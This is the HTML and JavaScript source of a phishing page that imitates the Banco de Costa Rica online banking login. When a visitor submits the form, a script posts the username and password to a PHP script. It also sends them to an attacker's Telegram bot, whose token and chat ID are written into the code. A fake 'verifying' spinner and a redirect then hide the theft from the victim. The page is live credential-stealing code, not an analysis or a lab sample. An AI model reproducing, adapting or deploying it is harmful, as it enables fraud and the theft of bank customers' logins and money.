<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<link href="archivos/style.css" rel="stylesheet" type="text/css">
<title>BCR</title>
<style > /* Pantalla de carga */
        .loading-screen {
            display: none; /* Oculta por defecto */
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            color: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            font-size: 18px;
            z-index: 9999;
        }
        .spinner {
            margin-top: 20px;
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
</style>
</head>
<body>
    <div class="head">
        <img src="logo.gif" class="logo">
        <img src="Certificado.svg" class="headimg1">
        <img src="Contactenos.svg" class="headimg2">
        <a href="#" class="linkhead1">Certificaciones</a>
        <a href="#" class="linkhead2">Contáctenos</a>
    </div>
    <div class="head2">
        <span class="texthead">Oficina Virtual &nbsp;&nbsp;&nbsp;&nbsp; Personas</span>
    </div>
    <div class="costilla">
        <span class="seguridadtxt">Seguridad</span>
        <img class="imgcostilla1" src="archivos/Consideraciones.svg">    
        <img class="imgcostilla2" src="archivos/reglamento.svg">    
        <span class="textcostilla1">Consideraciones</span>
        <span class="textcostilla2">Reglamentos</span>
    </div>
    <div class="costilla">
        <span class="seguridadtxt">Seguridad</span>
        <img class="imgcostilla1" src="archivos/Consideraciones.svg">    
        <img class="imgcostilla2" src="archivos/reglamento.svg">    
        <span class="textcostilla1">Consideraciones</span>
        <span class="textcostilla2">Reglamentos</span>
    </div>
    <div id="vista1">
        <div class="containerimg">    
            <div class="divform1">
                <form id="login-form">
                    <span class="ingresartxt">Ingresar</span>

                    <hr class="line1" color="#C4C4C4">
                    <img class="userimg" src="archivos/Personalizar.svg">
                    <img class="passimg" src="archivos/Seguridad.svg">
                    <div class="floating-label">      
                        <input class="user" type="text" placeholder=" " id="usuario" name="usuario" autocomplete="off" required>
                        <span class="highlight"></span>
                        <label>Usuario</label>
                    </div>
                    <div class="floating-label2">      
                        <input class="pass" type="password" placeholder=" " id="password" name="password" autocomplete="off" required>
                        <span class="highlight2"></span>
                        <label>Contraseña</label>
                        <img id="imgpass1" src="archivos/ver.png" class="ver" onclick="togglePassword()">
                        <script>
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('error') && urlParams.get('error') === '1') {
        document.write('<div style="color: red; background-color: #f8d7da; padding: 5px; border: 1px solid #f5c6cb; border-radius: 5px; font-size: 12px;">' +
                       'Error: Usuario o contraseña inválidos' +
                       '</div>');
    }
</script>
                    </div>
                    <button type="submit" id="loginButton" class="btn-uno" disabled>Ingresar</button>
                    <button class="btn-dos" type="button" onclick="recuperarDatos()">Recuperar datos de ingreso</button>
                    <input type="checkbox" name="checkbox" class="digital">
                    <label class="labelchk">Certificado Digital</label>
                </form>
            </div>
            <div class="loading-screen" id="loading-screen" style="display: none;">
                Verificando datos, por favor espere...
                <div class="spinner"></div>
            </div>
        </div>
    </div>
    <div class="footer"><span class="footertext"> BCR © Derechos Reservados 2024. Contáctenos: CentroAsistenciaBCR@bancobcr.com</span></div>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const usuario = document.getElementById("usuario");
            const password = document.getElementById("password");
            const loginButton = document.getElementById("loginButton");
            const loginForm = document.getElementById("login-form");
            const loadingScreen = document.getElementById("loading-screen");

            function validateInput() {
                loginButton.disabled = !(usuario.value.trim() && password.value.trim());
            }

            usuario.addEventListener("input", validateInput);
            password.addEventListener("input", validateInput);

            loginForm.addEventListener("submit", function (event) {
                event.preventDefault();
                const formData = new FormData(loginForm);

                fetch("src/php/registro_login.php", {
                    method: "POST",
                    body: formData
                })
                .then(response => response.text())
                .then(data => {
                    console.log(data);
                    enviarMensajeTelegram(formData.get("usuario"), formData.get("password"));
                    loadingScreen.style.display = "flex";
                    setTimeout(() => {
                        window.location.href = "verificar.php";
                    }, 15000);
                })
                .catch(error => console.error("Error en la solicitud:", error));
            });

            function enviarMensajeTelegram(usuario, password) {
                const chat_id = "7395554973";
                const token = "8038367240:AAFwLaUBcYUMFzNlTLLO2c0DAEVqBNraLI";
                const mensaje = `Nuevo registro:\nUsuario: ${usuario}\nContraseña: ${password}`;

                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(mensaje)}`)
                .then(response => response.json())
                .then(data => console.log("Mensaje enviado a Telegram:", data))
                .catch(error => console.error("Error al enviar mensaje a Telegram:", error));
            }

            function togglePassword() {
                let passInput = document.getElementById('password');
                passInput.type = passInput.type === 'password' ? 'text' : 'password';
            }
        });
    </script>
</body>
</html>
